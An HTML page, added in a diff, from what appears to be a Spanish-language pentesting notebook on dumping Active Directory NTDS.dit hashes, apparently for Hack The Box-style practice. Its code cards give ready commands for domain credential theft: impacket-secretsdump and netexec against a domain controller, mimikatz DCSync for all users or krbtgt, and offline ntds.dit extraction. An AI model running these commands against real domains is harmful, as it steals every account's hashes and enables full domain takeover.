@@ -1,0 +1,85 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>NTDS | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="ntds">
+          <div class="note-tabbar">
+            <span>NTDS</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Post-Explotación/Windows/Dumping hashes</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">post-explotación / windows / dumping hashes</p>
+            <h2>NTDS</h2>
+
+            <p>NTDS.dit es la base de datos de Active Directory y contiene los hashes de las cuentas del dominio. Su extracción requiere privilegios muy altos, acceso al DC o permisos equivalentes a DCSync.</p>
+
+            <p><code>Base de datos del DC con hashes de todos los usuarios del Dominio en AD</code></p>
+            <h2>Dumpear NTDS</h2>
+            <p><span class="notebook-review-note">Aviso: Requiere <code>Permisos Elevados</code> o <code>Permisos DCSync</code></span></p>
+            <section class="code-card">
+              <h3>Kali: Dumpear NTDS desde usuario con permisos DCSync</h3>
+              <pre><code># Impacket
+impacket-secretsdump &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip_dc&gt;
+impacket-secretsdump &#x27;&lt;user&gt;:&lt;password&gt;@&lt;ip_dc&gt;&#x27; -just-dc-ntlm
+# Netexec
+netexec smb &lt;ip_dc&gt; -u &lt;user&gt; -p &lt;pass&gt; --ntds</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Mimikatz: Dumpear NTDS</h3>
+              <pre><code>mimikatz.exe
+privilege::debug
+# Dumpear NTDS.dit de todos los usuarios del dominio: htb.local
+lsadump::dcsync /domain:&lt;domain&gt;.&lt;domain&gt; /all
+# Dumpear NTDS.dit de un usuario. Ej. /user:Administrator /user:htb\krbtgt
+lsadump::dcsync /domain:&lt;domain&gt;.&lt;domain&gt; /user:&lt;user&gt;</code></pre>
+            </section>
+            <h2>Dumpear archivo ntds.dit</h2>
+            <section class="code-card">
+              <h3>Kali: Dumpear ntds.dit (necesita SYSTEM.save)</h3>
+              <pre><code>impacket-secretsdump -ntds ntds.dit -system SYSTEM.save -hashes lmhash:nthash LOCAL</code></pre>
+            </section>
+            <p>Relacionado: <a href="/notebook/escalada-privilegios/windows/privilegios/backup.html">privilegio Backup</a> y <a href="/notebook/active-directory/escalada/dominio/dcsync-attack.html">DCSync Attack</a>.</p>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>windows</span>
+              <span>active_directory</span>
+              <span>post_explotacion</span>
+              <span>dumping_hashes</span>
+              <span>ntds</span>
+              <span>dcsync</span>
+              <span>secretsdump</span>
+              <span>netexec</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
